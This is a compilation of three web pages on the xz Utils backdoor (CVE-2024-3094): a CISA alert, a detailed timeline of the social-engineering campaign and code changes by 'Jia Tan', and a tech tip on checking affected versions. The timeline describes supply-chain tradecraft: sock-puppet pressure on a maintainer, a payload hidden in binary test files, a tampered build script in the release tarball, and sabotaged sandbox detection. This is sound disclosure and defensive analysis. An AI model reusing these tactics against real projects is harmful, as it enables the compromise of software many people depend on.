  [Government](/topics/government)[Educational Institutions](/topics/educational-institutions)[Industry](/topics/industry)[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial)[Individuals and Families](/topics/individuals-and-families)[Small and Medium Businesses](/topics/small-and-medium-businesses)[Find Help Locally](/audiences/find-help-locally)[Faith-Based Community](/audiences/faith-based-community)[Executives](/audiences/executives)[High-Risk Communities](/audiences/high-risk-communities)
* [Spotlight](/spotlight)
* Resources & Tools

  [Resources & Tools](/resources-tools)

  [All Resources & Tools](/resources-tools/all-resources-tools)

  [Services](/resources-tools/services)

  [Programs](/resources-tools/programs)

  [Resources](/resources-tools/resources)

  [Training](/resources-tools/training)

  [Groups](/resources-tools/groups)
* News & Events

  [News & Events](/news-events)

  [News](/news-events/news)

  [Events](/news-events/events)

  [Cybersecurity Alerts & Advisories](/news-events/cybersecurity-advisories)

  [Directives](/news-events/directives)

  [Request a CISA Speaker](/news-events/request-speaker)

  [Congressional Testimony](/news-events/congressional-testimony)

  [CISA Conferences](/cisa-conferences)

  [CISA Live!](/cisa-live)
* Careers

  [Careers](/careers)

  [Benefits & Perks](/careers/benefits-perks)

  [HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)

  [Hiring](/general-recruitment-and-hiring-faqs)

  [Resume & Application Tips](/careers/resume-application-tips)

  [Students & Recent Graduates](/students-recent-graduates-employment-opportunities)

  [Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)

  [Work @ CISA](/careers/work-cisa)
* About

  [About](/about)

  [Culture](/about/culture)

  [Divisions & Offices](/about/divisions-offices)

  [Regions](/about/regions)

  [Leadership](/about/leadership)

  [Doing Business with CISA](/doing-business-cisa)

  [Site Links](/site-links)

  [Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)

  [CISA GitHub](/cisa-github)

  [CISA Central](/cisa-central)

  [2024 Year In Review](/about/2024YIR)

  [Contact Us](/about/contact-us)

  [Subscribe](/about/contact-us/subscribe-updates-cisa)

[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools "Free Cyber Services")[Election Threat Updates](/topics/election-security/election-threat-updates)[#protect2024](/protect2024)[Secure Our World](/node/18883)[Shields Up](/node/8056)[Report A Cyber Issue](/report)

Breadcrumb

1. [Home](/)
2. [News & Events](/news-events)
3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)
4. [Alert](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A93)

Share:

Alert
# Reported Supply Chain Compromise Affecting XZ Utils Data Compression Library, CVE-2024-3094

Release DateMarch 29, 2024

CISA and the open source community are responding to reports of malicious code being embedded in XZ Utils versions 5.6.0 and 5.6.1. This activity was assigned [CVE-2024-3094](https://access.redhat.com/security/cve/CVE-2024-3094 "CVE-2024-3094"). XZ Utils is data compression software and may be present in Linux distributions. The malicious code may allow unauthorized access to affected systems.

CISA recommends developers and users to downgrade XZ Utils to an uncompromised version—such as XZ Utils 5.4.6 Stable—hunt for any malicious activity and report any positive findings to CISA.

See the following advisory for more information:

* [Red Hat: Urgent security alert for Fedora 41 and Rawhide users](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users "Red Hat: Urgent security alert for Fedora 41 and Rawhide users")

This product is provided subject to this [Notification](/notification "Follow link") and this [Privacy & Use](/privacy-policy "Follow link") policy.

## Please share your thoughts

We recently updated our anonymous [product survey](https://cisasurvey.gov1.qualtrics.com/jfe/form/SV_9n4TtB8uttUPaM6?product=https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094); we’d welcome your feedback.

Return to top

* [Topics](/topics)
* [Spotlight](/spotlight)
* [Resources & Tools](/resources-tools)
* [News & Events](/news-events)
* [Careers](/careers)
* [About](/about)

[Cybersecurity & Infrastructure Security Agency](/ "Go to the Cybersecurity & Infrastructure Security Agency homepage")

* [Facebook](https://www.facebook.com/CISA)
* [Twitter](https://twitter.com/CISAgov)
* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)
* [YouTube](https://www.youtube.com/%40cisagov)
* [Instagram](https://www.instagram.com/cisagov)
* [RSS](/subscribe-updates-cisa)

CISA Central
1-844-Say-CISA
SayCISA@cisa.dhs.gov

DHS Seal
CISA.gov
An official website of the U.S. Department of Homeland Security

* [About CISA](/about "About CISA")
* [Budget and Performance](https://www.dhs.gov/performance-financial-reports "Budget and Performance")
* [DHS.gov](https://www.dhs.gov "Department of Homeland Security")
* [Equal Opportunity & Accessibility](/oedia "Equal Opportunity & Accessibility")
* [FOIA Requests](https://www.dhs.gov/foia "FOIA Requests")
* [No FEAR Act](/no-fear-act "No FEAR Act Reporting")
* [Office of Inspector General](https://www.oig.dhs.gov/ "Office of Inspector General")
* [Privacy Policy](/privacy-policy "Privacy Policy")
* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 "Subscribe to Email Updates")
* [The White House](https://www.whitehouse.gov/ "The White House")
* [USA.gov](https://www.usa.gov/ "USA.gov")
* [Website Feedback](/forms/feedback "Website Feedback")



=== Content from research.swtch.com_cb84672c_20250111_034036.html ===

### [research!rsc](/)

#### Thoughts and links about programming, by [Russ Cox](https://swtch.com/~rsc/)

[RSS](/feed.atom)

# Timeline of the xz open source attack Posted on Monday, April 1, 2024.Updated Wednesday, April 3, 2024.

Over a period of over two years, an attacker using the name “Jia Tan”
worked as a diligent, effective contributor to the xz compression library,
eventually being granted commit access and maintainership.
Using that access, they installed a very subtle, carefully hidden backdoor into liblzma,
a part of xz that also happens to be a dependency of OpenSSH sshd
on Debian, Ubuntu, and Fedora, and other systemd-based Linux systems that patched sshd to link libsystemd.
(Note that this does not include systems like Arch Linux, Gentoo, and NixOS, which do not patch sshd.)
That backdoor watches for the attacker sending hidden commands at the start of an SSH session,
giving the attacker the ability to run an arbitrary command on the target system without logging in:
unauthenticated, targeted remote code execution.

The attack was [publicly disclosed on March 29, 2024](https://www.openwall.com/lists/oss-security/2024/03/29/4) and
appears to be the first serious known supply chain attack on widely used open source software.
It marks a watershed moment in open source supply chain security, for better or worse.

This post is a detailed timeline that I have constructed of the
social engineering aspect of the attack, which appears to date
back to late 2021.
(See also my [analysis of the attack script](xz-script).)

Corrections or additions welcome on [Bluesky](https://bsky.app/profile/swtch.com/post/3kp4my7wdom2q), [Mastodon](https://hachyderm.io/%40rsc/112199506755478946), or email.
[## Prologue](#prologue)

**2005–2008**: [Lasse Collin, with help from others](https://github.com/kobolabs/liblzma/blob/87b7682ce4b1c849504e2b3641cebaad62aaef87/doc/history.txt), designs the .xz file format using the LZMA compression algorithm, which compresses files to about 70% of what gzip did [1]. Over time this format becomes widely used for compressing tar files, Linux kernel images, and many other uses.
[## Jia Tan arrives on scene, with supporting cast](#jia_tan_arrives_on_scene_with_supporting_cast)

**2021-10-29**: Jia Tan sends [first, innocuous patch](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00512.html) to the xz-devel mailing list, adding “.editorconfig” file.

**2021-11-29**: Jia Tan sends [second innocuous patch](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00519.html) to the xz-devel mailing list, fixing an apparent reproducible build problem. More patches that seem (even in retrospect) to be fine follow.

**2022-02-07**: Lasse Collin merges [first commit with “jiat0218@gmail.com” as author in git metadata](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6468f7e41a8e9c611e4ba8d34e2175c5dacdbeb4) (“liblzma: Add NULL checks to LZMA and LZMA2 properties encoders”).

**2022-04-19**: Jia Tan sends [yet another innocuous patch](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00553.html) to the xz-devel mailing list.

**2022-04-22**: “Jigar Kumar” sends [first of a few emails](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00557.html) complaining about Jia Tan’s patch not landing. (“Patches spend years on this mailing list. There is no reason to think anything is coming soon.”) At this point, Lasse Collin has already landed four of Jia Tan’s patches, marked by “Thanks to Jia Tan” in the commit message.

**2022-05-19**: “Dennis Ens” sends [mail to xz-devel](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00562.html) asking if XZ for Java is maintained.

**2022-05-19**: Lasse Collin [replies](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00563.html) apologizing for slowness and adds “Jia Tan has helped me off-list with XZ Utils and he might have a bigger role in the future at least with XZ Utils. It’s clear that my resources are too limited (thus the many emails waiting for replies) so something has to change in the long term.”

**2022-05-27**: Jigar Kumar sends [pressure email](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00565.html) to patch thread. “Over 1 month and no closer to being merged. Not a surprise.”

**2022-06-07**: Jigar Kumar sends [pressure email](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00566.html) to Java thread. “Progress will not happen until there is new maintainer. XZ for C has sparse commit log too. Dennis you are better off waiting until new maintainer happens or fork yourself. Submitting patches here has no purpose these days. The current maintainer lost interest or doesn’t care to maintain anymore. It is sad to see for a repo like this.”

**2022-06-08**: Lasse Collin [pushes back](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html). “I haven’t lost interest but my ability to care has been fairly limited mostly due to longterm mental health issues but also due to some other things. Recently I’ve worked off-list a bit with Jia Tan on XZ Utils and perhaps he will have a bigger role in the future, we’ll see. It’s also good to keep in mind that this is an unpaid hobby project.”

**2022-06-10**: Lasse Collin merges [first commit with “Jia Tan” as author in git metadata](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=aa75c5563a760aea3aa23d997d519e702e82726b) (“Tests: Created tests for hardware functions”). Note also that there was one earlier commit on 2022-02-07 that had the full name set only to jiat75.

**2022-06-14**: Lasse Collin merges [only commit with “jiat75@gmail.com” as author](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=0354d6cce3ff98ea6f927107baf216253f6ce2bb). This could have been a temporary git misconfiguration on Jia Tan’s side forgetting their fake email address.

**2022-06-14**: Jugar Kumar sends [pressure email](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00568.html). “With your current rate, I very doubt to see 5.4.0 release this year. The only progress since april has been small changes to test code. You ignore the many patches bit rotting away on this mailing list. Right now you choke your repo. Why wait until 5.4.0 to change maintainer? Why delay what your repo needs?”

**2022-06-21**: Dennis Ens sends [pressure email](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00569.html). “I am sorry about your mental health issues, but its important to be aware of your own limits. I get that this is a hobby project for all contributors, but the community desires more. Why not pass on maintainership for XZ for C so you can give XZ for Java more attention? Or pass on XZ for Java to someone else to focus on XZ for C? Trying to maintain both means that neither are maintained well.”

**2022-06-22**: Jigar Kumar sends [pressure email](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00570.html) to C patch thread. “Is there any progress on this? Jia I see you have recent commits. Why can’t you commit this yourself?”

**2022-06-29**: Lasse Collin [replies](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00571.html): “As I have hinted in earlier emails, Jia Tan may have a bigger role in the project in the future. He has been helping a lot off-list and is practically a co-maintainer already. :-) I know that not much has happened in the git repository yet but things happen in small steps. In any case some change in maintainership is already in progress at least for XZ Utils.”
[## Jia Tan becomes maintainer](#jia_tan_becomes_maintainer)

At this point Lasse seems to have started working even more closely with Jia Tan. Brian Krebs [observes](https://infosec.exchange/%40briankrebs/112197305365490518) that many of these email addresses never appeared elsewhere on the internet, even in data breaches (nor again in xz-devel). It seems likely that they were fakes created to push Lasse to give Jia more control. It worked. Over the next few months, Jia started replying to threads on xz-devel authoritatively about the upcoming 5.4.0 release.

**2022-09-27**: Jia Tan gives [release summary](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00593.html) for 5.4.0. (“The 5.4.0 release that will contain the multi threaded decoder is planned for December. The list of open issues related to 5..4.0 [sic] in general that I am tracking are...”)

**2022-10-28**: Jia Tan [added to the Tukaani organization](https://github.com/JiaT75?tab=overview&from=2022-10-01&to=2022-10-31) on GitHub. Being an organization member does not imply any special access, but it is a necessary step before granting maintainer access.

**2022-11-30**: Lasse Collin [changes bug report email](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=764955e2d4f2a5e8d6d6fec63af694f799e050e7) from his personal address to an alias that goes to him and Jia Tan, notes in README that “the project maintainers Lasse Collin and Jia Tan can be reached via xz@tukaani.org”.

**2022-12-30**: Jia Tan merges [a batch of commits directly into the xz repo](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=8ace358d65059152d9a1f43f4770170d29d35754) (“CMake: Update .gitignore for CMake artifacts from in source build”). At this point we know they have commit access. Interestingly, a [few commits later](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=799ead162de63b8400733603d3abcd2e1977bdca) in the same batch is the only commit with a different full name: “Jia Cheong Tan”.

**2023-01-11**: Lasse Collin [tags and builds his final release](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=18b845e69752c975dfeda418ec00eda22605c2ee), v5.4.1.

**2023-03-18**: Jia Tan [tags and builds their first release](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6ca8046ecbc7a1c81ee08f544bfd1414819fb2e8), v5.4.2.

**2023-03-20**: Jia Tan [updates Google oss-fuzz configuration](https://github.com/google/oss-fuzz/commit/6403e93344476972e908ce17e8244f5c2b957dfd) to send bugs to them.

**2023-06-22**: Hans Jansen sends [a pair](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=23b5c36fb71904bfbe16bb20f976da38dadf6c3b) of [patches](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=b72d21202402a603db6d512fb9271cfa83249639), merged by Lasse Collin, that use the “[GNU indirect function](https://maskray.me/blog/2021-01-18-gnu-indirect-function)” feature to select a fast CRC function at startup time. The final commit is [reworked by Lasse Collin](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=ee44863ae88e377a5df10db007ba9bfadde3d314) and merged by Jia Tan. This change is important because it provides a hook by which the backdoor code can modify the global function tables before they are remapped read-only. While this change could be an innocent performance optimization by itself, Hans Jansen returns in 2024 to promote the backdoored xz and otherwise does not exist on the internet.

**2023-07-07**: Jia Tan [disables ifunc support during oss-fuzz builds](https://github.com/google/oss-fuzz/commit/d2e42b2e489eac6fe6268e381b7db151f4c892c5), claiming ifunc is incompatible with address sanitizer. This may well be innocuous on its own, although it is also more groundwork for using ifunc later.

**2024-01-19**: Jia Tan [moves web site to GitHub pages](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=c26812c5b2c8a2a47f43214afe6b0b840c73e4f5), giving them control over the XZ Utils web page. Lasse Collin presumably created the DNS records for the xz.tukaani.org subdomain that points to GitHub pages. After the attack was discovered, Lasse Collin deleted this DNS record to move back to [tukaani.org](https://tukaani.org), which he controls.
[## Attack begins](#attack_begins)

**2024-02-23**: Jia Tan [merges hidden backdoor binary code](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0) well hidden inside some binary test input files. The README already said (from long before Jia Tan showed up) “This directory contains bunch of files to test handling of .xz, .lzma (LZMA\_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better “source code” than the files themselves.” Having these kinds of test files is very common for this kind of library. Jia Tan took advantage of this to add a few files that wouldn’t be carefully reviewed.

**2024-02-24**: Jia Tan [tags and builds v5.6.0](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429) and publishes an xz-5.6.0.tar.gz distribution with an extra, malicious build-to-host.m4 that adds the backdoor when building a deb/rpm package. This m4 file is not present in the source repository, but many other legitimate ones are added during package as well, so it’s not suspicious by itself. But the script has been modified from the usual copy to add the backdoor. See my [xz attack shell script walkthrough post](xz-script) for more.

**2024-02-24**: Gentoo [starts seeing crashes in 5.6.0](https://bugs.gentoo.org/925415). This seems to be an actual ifunc bug, rather than a bug in the hidden backdoor, since this is the first xz with Hans Jansen’s ifunc changes, and Gentoo does not patch sshd to use libsystemd, so it doesn’t have the backdoor.

**2024-02-26**: Debian [adds xz-utils 5.6.0-0.1](https://tracker.debian.org/news/1506761/accepted-xz-utils-560-01-source-into-unstable/) to unstable.

**2024-02-27**: Jia Tan starts emailing Richard W.M. Jones to update Fedora 40 (privately confirmed by Rich Jones).

**2024-02-28**: Debian [adds xz-utils 5.6.0-0.2](https://tracker.debian.org/news/1507917/accepted-xz-utils-560-02-source-into-unstable/) to unstable.

**2024-02-28**: Jia Tan [breaks landlock detection](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=a100f9111c8cc7f5b5f0e4a5e8af3de7161c7975) in configure script by adding a subtle typo in the C program used to check for [landlock support](https://docs.kernel.org/userspace-api/landlock.html). The configure script tries to build and run the C program to check for landlock support, but since the C program has a syntax error, it will never build and run, and the script will always decide there is no landlock support. Lasse Collin is listed as the committer; he may have missed the subtle typo, or the author may be forged. Probably the former, since Jia Tan did not bother to forge committer on his many other changes. This patch seems to be setting up for something besides the sshd change, since landlock support is part of the xz command and not liblzma. Exactly what is unclear.

**2024-02-29**: On GitHub, @teknoraver [sends pull request](https://github.com/systemd/systemd/pull/31550) to stop linking liblzma into libsystemd. It appears that this would have defeated the attack. [Kevin Beaumont speculates](https://doublepulsar.com/inside-the-failed-attempt-to-backdoor-ssh-globally-that-got-caught-by-chance-bbfe628fafdd) that knowing this was on the way may have accelerated the attacker’s schedule. @teknoraver [commented on HN](https://news.ycombinator.com/item?id=39916125) that the liblzma PR was one in a series of dependency slimming changes for libsystemd; there were [two](https://github.com/systemd/systemd/pull/31131#issuecomment-1917693005) [mentions](https://github.com/systemd/systemd/pull/31131#issuecomment-1918667390) of it in late January.

**2024-03-04**: RedHat distributions [start seeing Valgrind errors](https://bugzilla.redhat.com/show_bug.cgi?id=2267598) in liblzma’s `_get_cpuid` (the entry to the backdoor). The race is on to fix this before the Linux distributions dig too deeply.

**2024-03-05**: The [libsystemd PR is merged](https://github.com/systemd/systemd/commit/3fc72d54132151c131301fc7954e0b44cdd3c860) to remove liblzma. Another race is on, to get liblzma backdoor’ed before the distros break the approach entirely.

**2024-03-05**: Debian [adds xz-utils 5.6.0-0.2](https://tracker.debian.org/news/1509743/xz-utils-560-02-migrated-to-testing/) to testing.

**2024-03-05**: Jia Tan commits [two ifunc](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=ed957d39426695e948b06de0ed952a2fbbe84bd1) [bug fixes](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=4e1c97052b5f14f4d6dda99d12cbbd01e66e3712). These seem to be real fixes for the actual ifunc bug. One commit links to the Gentoo bug and also typos an [upstream GCC bug](https://gcc.gnu.org/bugzilla/show_bug.cgi?id=114115).

**2024-03-08**: Jia Tan [commits purported Valgrind fix](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=82ecc538193b380a21622aea02b0ba078e7ade92). This is a misdirection, but an effective one.

**2024-03-09**: Jia Tan [commits updated backdoor files](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1). This is the actual Valgrind fix, changing the two test files containing the attack code. “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.”

**2024-03-09**: Jia Tan [tags and build v5.6.1](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=fd1b975b7851e081ed6e5cf63df946cd5cbdbb94) and publishes xz 5.6.1 distribution, containing a new backdoor. To date I have not seen any analysis of how the old and new backdoors differ.

**2024-03-20**: Lasse Collin sends LKML a patch set [replacing his personal email](https://lkml.org/lkml/2024/3/20/1009) with [both himself and Jia Tan](https://lkml.org/lkml/2024/3/20/1008) as maintainers of the xz compression code in the kernel. There is no indication that Lasse Collin was acting nefariously here, just cleaning up references to himself as sole maintainer. Of course, Jia Tan may have prompted this, and being able to send xz patches to the Linux kernel would have been a nice point of leverage for Jia Tan’s future work. We’re not at [trusting trust](nih) levels yet, but it would be one step closer.

**2024-03-25**: Hans Jansen is back (!), [filing a Debian bug](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708) to get xz-utils updated to 5.6.1. Like in the 2022 pressure campaign, more name###@mailhost addresses that don’t otherwise exist on the internet show up to advocate for it.

**2024-03-27**: Debian updates to 5.6.1.

**2024-03-28**: Jia Tan [files an Ubuntu bug](https://bugs.launchpad.net/ubuntu/%2Bsource/xz-utils/%2Bbug/2059417) to get xz-utils updated to 5.6.1 from Debian.
[## Attack detected](#attack_detected)

**2024-03-28**: Andres Freund discovers bug, privately notifies Debian and distros@openwall. RedHat assigns CVE-2024-3094.

**2024-03-28**: Debian [rolls back 5.6.1](https://tracker.debian.org/news/1515519/accepted-xz-utils-561really545-1-source-into-unstable/), introducing 5.6.1+really5.4.5-1.

**2024-03-28**: Arch Linux [changes 5.6.1 to build from Git](https://gitlab.archlinux.org/archlinux/packaging/packages/xz/-/commit/881385757abdc39d3cfea1c3e34ec09f637424ad).

**2024-03-29**: Andres Freund [posts backdoor warning](https://www.openwall.com/lists/oss-security/2024/03/29/4) to public oss-security@openwall list, saying he found it “over the last weeks”.

**2024-03-29**: RedHat [announces that the backdoored xz shipped](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users) in Fedora Rawhide and Fedora Linux 40 beta.

**2024-03-30**: Debian [shuts down builds](https://fulda.social/%40Ganneff/112184975950858403) to rebuild their build machines using Debian stable (in case the malware xz escaped their sandbox?).

**2024-03-30**: Haiku OS [moves to GitHub source repo snapshots](https://github.com/haikuports/haikuports/commit/3644a3db2a0ad46971aa433c105e2cce9d141b46).
[## Further Reading](#further_reading)

* Evan Boehs, [Everything I know about the XZ backdoor](https://boehs.org/node/everything-i-know-about-the-xz-backdoor) (2024-03-29).* Filippo Valsorda, [Bluesky](https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b) re backdoor operation (2024-03-30).* Michał Zalewski, [Techies vs spies: the xz backdoor debate](https://lcamtuf.substack.com/p/technologist-vs-spy-the-xz-backdoor) (2024-03-30).* Michał Zalewski, [OSS backdoors: the folly of the easy fix](https://lcamtuf.substack.com/p/oss-backdoors-the-allure-of-the-easy) (2024-03-31).* Connor Tumbleson, [Watching xz unfold from afar](https://connortumbleson.com/2024/03/31/watching-xz-unfold-from-afar/) (2024-03-31).* nugxperience, [Twitter](https://twitter.com/nugxperience/status/1773906926503591970) re awk and rc4 (2024-03-29)* birchb0y, [Twitter](https://twitter.com/birchb0y/status/1773871381890924872) re time of day of commit vs level of evil (2024-03-29)* Dan Feidt, [‘xz utils’ Software Backdoor Uncovered in Years-Long Hacking Plot](https://unicornriot.ninja/2024/xz-utils-software-backdoor-uncovered-in-years-long-hacking-plot/) (2024-03-30)* smx-smz, [[WIP] XZ Backdoor Analysis and symbol mapping](https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504)* Dan Goodin, [What we know about the xz Utils backdoor that almost infected the world](https://arstechnica.com/security/2024/04/what-we-know-about-the-xz-utils-backdoor-that-almost-infected-the-world/) (2024-04-01)* Akamai Security Intelligence Group, [XZ Utils Backdoor — Everything You Need to Know, and What You Can Do](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know) (2024-04-01)* Kevin Beaumont, [Inside the failed attempt to backdoor SSH globally — that got caught by chance](https://doublepulsar.com/inside-the-failed-attempt-to-backdoor-ssh-globally-that-got-caught-by-chance-bbfe628fafdd) (2024-03-31)* amlweems, [xzbot: notes, honeypot, and exploit demo for the xz backdoor](https://github.com/amlweems/xzbot) (2024-04-01)* Rhea Karty and Simon Henniger, [XZ Backdoor: Times, damned times, and scams](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and) (2024-03-30)* Andy Greenberg and Matt Burgess, [The Mystery of ‘Jia Tan,’ the XZ Backdoor Mastermind](https://www.wired.com/story/jia-tan-xz-backdoor/) (2024-04-03)* [Risky Business #743 -- A chat about the xz backdoor with the guy who found it](https://risky.biz/RB743/) (2024-04-03)



=== Content from www.darkreading.com_7dad9feb_20250111_034041.html ===
![Logo Informa](/build/_assets/informaLogoWhite-RZAE7EJI.png)

TechTarget and Informa Tech’s Digital Business Combine.TechTarget and Informa

## TechTarget and Informa Tech’s Digital Business Combine.

Together, we power an unparalleled network of 220+ online properties covering 10,000+ granular topics, serving an audience of 50+ million professionals with original, objective content from trusted sources. We help you gain critical insights and make more informed decisions across your business priorities.

[Black Hat News](/program/black-hat)[Omdia Cybersecurity](/program/omdia-cybersecurity)[Advertise](https://reg.darkreading.com/media-kit?kcode=drsitehd)[![Dark Reading Logo](https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blte9ead971f13c662e/65437029846d7c040a6e588d/Logo_-_Dark_Reading.svg?width=476&auto=webp&quality=80&disable=upscale "Dark Reading Logo")](/)[Newsletter Sign-Up](https://dr-resources.darkreading.com/free/w_defa3135/prgm.cgi)[Newsletter Sign-Up](https://dr-resources.darkreading.com/free/w_defa3135/prgm.cgi)Cybersecurity Topics
#### Related Topics

* [Application Security](/application-security)
* [Cybersecurity Careers](/cybersecurity-operations/cybersecurity-careers)
* [Cloud Security](/cloud-security)
* [Cyber Risk](/cyber-risk)
* [Cyberattacks & Data Breaches](/cyberattacks-data-breaches)
* [Cybersecurity Analytics](/cybersecurity-analytics)
* [Cybersecurity Operations](/cybersecurity-operations)
* [Data Privacy](/cyber-risk/data-privacy)
* [Endpoint Security](/endpoint-security)
* [ICS/OT Security](/ics-ot-security)

* [Identity & Access Mgmt Security](/cybersecurity-operations/identity-access-management-security)
* [Insider Threats](/vulnerabilities-threats/insider-threats)
* [IoT](/ics-ot-security/iot)
* [Mobile Security](/endpoint-security/mobile-security)
* [Perimeter](/cybersecurity-operations/perimeter)
* [Physical Security](/cybersecurity-operations/physical-security)
* [Remote Workforce](/endpoint-security/remote-workforce)
* [Threat Intelligence](/threat-intelligence)
* [Vulnerabilities & Threats](/vulnerabilities-threats)
World
#### Related Topics

* [DR Global](/program/dr-global)
* [Middle East & Africa](/keyword/middle-east-africa)

* [Asia Pacific](/keyword/asia-pacific)
[See All](/program/dr-global)[The Edge](/program/the-edge)[DR Technology](/program/dr-technology)Events
#### Related Topics

* [Upcoming Events](/events)
* [Podcasts](/podcasts)

* [Webinars](/resources?types=Webinar)
[SEE ALL](/events)Resources
#### Related Topics

* [Library](/resources)
* [Newsletters](https://dr-resources.darkreading.com/free/w_defa3135/prgm.cgi)
* [Podcasts](/podcasts)
* [Reports](/resources?types=Report)
* [Videos](/videos)
* [Webinars](/resources?types=Webinar)

* [Whitepapers](/resources?types=Whitepaper)
* [Partner Perspectives](/keyword/partner-perspectives)
[SEE ALL](/resources)

* [Vulnerabilities & Threats](/vulnerabilities-threats)
* [Cyberattacks & Data Breaches](/cyberattacks-data-breaches)

[![DR Technology Logo](https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt4c091cd3ac9935ea/653a71456ad0f6040a6f71bd/Dark_Reading_Logo_Technology_0.png?width=700&auto=webp&quality=80&disable=upscale "DR Technology Logo")

News, news analysis, and commentary on the latest trends in cybersecurity technology.](/program/dr-technology)
# Are You Affected by the Backdoor in XZ Utils?Are You Affected by the Backdoor in XZ Utils?

In this Tech Tip, we outline how to check whether a system is impacted by the newly discovered backdoor in the open source xz compression utility.

[![Picture of Dark Reading Staff](https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt99b391f0439c1434/64f179af7de67f4e4300e517/285801_DR23_Graphics_Website_Author_Logo_0.jpg?width=100&auto=webp&quality=80&disable=upscale "Picture of Dark Reading Staff")](/author/dark-reading-staff)[Dark Reading Staff](/author/dark-reading-staff), Dark Reading

March 29, 2024

3 Min Read![A man opens a door with a key hanging from the lock](https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt61e6949e81096c73/66073b0808eaba486cc8d36a/opendoor-MSRF-alamy.jpg?width=1280&auto=webp&quality=95&format=jpg&disable=upscale "A man opens a door with a key hanging from the lock")Source: MSRF via Alamy Stock Photo

Red Hat is warning that a vulnerability in XZ Utils, the XZ format compression utility included in Unix-like operating systems such as Linux, is a backdoor. Users should either downgrade the utility to a safer version or disable SSH entirely so that the backdoor cannot be exploited.

The code injection vulnerability ([CVE-2024-3094](https://www.cve.org/CVERecord?id=CVE-2024-3094)) injects code into the authentication process that allows malicious actors to gain remote access to the system. [Red Hat said in its advisory](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users) to "PLEASE IMMEDIATELY STOP USAGE OF ANY FEDORA RAWHIDE INSTANCES for work or personal activity" until the company reverted its xz version to 5.4.x and gave the all-clear. The flaw has been assigned a Common Vulnerability Scoring System (CVSS) score of 10.0.

The flaw is present in [xz versions 5.6.0](https://github.com/tukaani-project/xz/releases/tag/v5.6.0) (released Feb. 24) and 5.6.1 (released March 9). The US Cybersecurity and Infrastructure Security Agency (CISA) [advised developers and users](https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094) to downgrade XZ Utils to an earlier, uncompromised version, such as [XZ Utils 5.4.6 Stable](https://github.com/tukaani-project/xz/releases/tag/v5.4.6).

Here's how to tell whether the system is running the affected version:

xz --version

If the output says xz (XZ UTils) 5.6.1 or liblzma 5.6.1, then users should either apply the update for their distribution (if available), downgrade xz, or disable SSH for the time being.

While the issue primarily affects Linux distributions, there are reports that some versions of MacOS may be running the compromised packages. If that is the case, running brew upgrade on the Mac should downgrade xz from 5.6.0 to 5.4.6.

Binarly has created and released a [free scanning tool](https://xz.fail/) to help defenders spot signs of the backdoor. The user upload an ELF file less than 5Mb in size and the tool looks for the backdoor code. "We built the tool in a way it could used for finding similar ways of implantation in other applications beyond XZ Utils," says Alex Matrosov, founder and CEO of Binarly.

## Which Linux Distros Are Affected?

